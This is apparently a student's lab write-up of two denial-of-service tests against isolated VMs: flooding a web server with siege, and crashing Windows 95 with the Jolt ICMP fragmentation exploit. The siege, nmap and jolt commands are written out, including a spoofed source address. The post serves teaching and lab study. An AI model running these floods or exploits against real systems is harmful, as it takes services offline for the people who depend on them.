---
title: "Denial of Service in Action"
date: 2025-09-02
tags: [DoS, DDoS, Networking, ICMP, Siege, Jolt, Windows95, Kali]
description: Notes from Lab where I tested HTTP stress with siege and crashed a Windows 95 VM using the Jolt ICMP fragmentation exploit.
---

## Overview of the Lab

This lab was all about **Denial of Service (DoS)**. I tried two classic methods:

1. Using **siege** to overload a web server with too many HTTP requests.  
2. Using **jolt**, an old exploit that sends broken ICMP packets to crash Windows 95.

Both tests were done safely in a lab with VMs.

---

##  Setup

- **Attacker:** Kali Linux  

![Kali](assets/img/DOS/Kali.png)  

- **Victims:**  
  - CYSCA2014InABox VM (web server) 

  ![CYSCA](assets/img/DOS/CYSCA.png) 

  - Windows 95 VM (legacy system)  
 
  ![WIN95](assets/img/DOS/WIN95.png)


- **Tools:** `top`, `siege`, `nmap`, `gcc`, `wireshark` / `tshark`  

---

## Part 1 — HTTP Stress with Siege

### Step 1: Check CPU usage
On both Kali and the server VM:

```bash
top
```
System Summary for Kali:

![Kali_top](assests/img/DOS/Kali_top.png)

System Summary for CYSCA2014:

![CYSCA_top](assests/img/DOS/CYSCA_top.png)

Idle % was high before the attack. (i.e. under normal startup conditions and not currently under load)

(Note: On Kali, the idle CPU was not near to 100% before running siege because I ran top immediately after starting the VM, when background services were still initialising.  After settling, idle percentages are typically greater.  The more significant impact occurred on the CYSCA server, where idle CPU reduced dramatically once the siege began.)

---

### Step 2: Run siege

```bash
siege --concurrent=250 http://192.168.100.210/
```

![Kali_Seige](assests/img/DOS/Kali_seige.png)

---

### Step 3: What happened

On Kali, siege became the main CPU hog.

On the server, CPU idle % dropped and the process list filled with web workers.

![CYSCA_under_Seige](assests/img/DOS/CYSCA_under_seige.png)

This showed how a flood of requests alone can push a server to its limit.

---

## Part 2 — ICMP Fragmentation with Jolt

### Step 1: Find the Win95 target

```bash
nmap -sn 192.168.100.0/24
nmap -O 192.168.100.211
```

![Nmap_kali](assests/img/DOS/Nmap_kali.png)

---

### Step 2: Compile jolt

```bash
gcc -o jolt jolt.c
```

---

### Step 3: Run jolt

```bash
#./jolt <dstaddr> <saddr> [number]
./jolt 192.168.100.211 192.168.100.211 50
```

dstaddr → target IP (Win95).

saddr  → spoofed source IP (same as target for the lab).

number → how many packets to send.

![Jolt](assests/img/DOS/jolt_run.png)

---

### Step 4: What happened

- Jolt sent oversized, fragmented ICMP packets.
- Windows 95 tried to put them back together.
- The OS froze — the clock stopped and the VM became unresponsive.
- This crash came from a bug in the old TCP/IP stack.


Wireshark/tshark showing fragmented ICMP to Win95:
![Wireshark](assests/img/DOS/Wireshark.png)

Win95 frozen with clock-drift:
![WIN95_Crash](assests/img/DOS/WIN95_crash.png)
---

## What I Learned

- DoS can be simple. Siege showed that just too many requests can hurt a system.
- Protocol bugs matter. Jolt showed how a single flaw in packet handling could crash an OS.
- Modern systems are stronger. Windows 10, Linux, macOS won’t fall for Jolt. But resource exhaustion attacks like siege still matter.
- Always test safely. These tools are for labs only — never run them on real networks.

Commands Recap
# CPU usage

```bash
top
```

# HTTP stress

```bash
siege --concurrent=250 http://<target-ip>/
```

# Find Windows 95

```bash
nmap -sn 192.168.100.0/24
nmap -O <win95-ip>
```

# Build and run Jolt

```bash
gcc -o jolt jolt.c
./jolt <dstaddr> <saddr> 100
```

# Packet capture
```bash
sudo tshark -i eth1 icmp
```

## Final Thoughts

This lab gave me a hands-on look at both load-based DoS and exploit-based DoS. It was fun to see how old systems crash so easily, and a reminder of why updates and patches matter.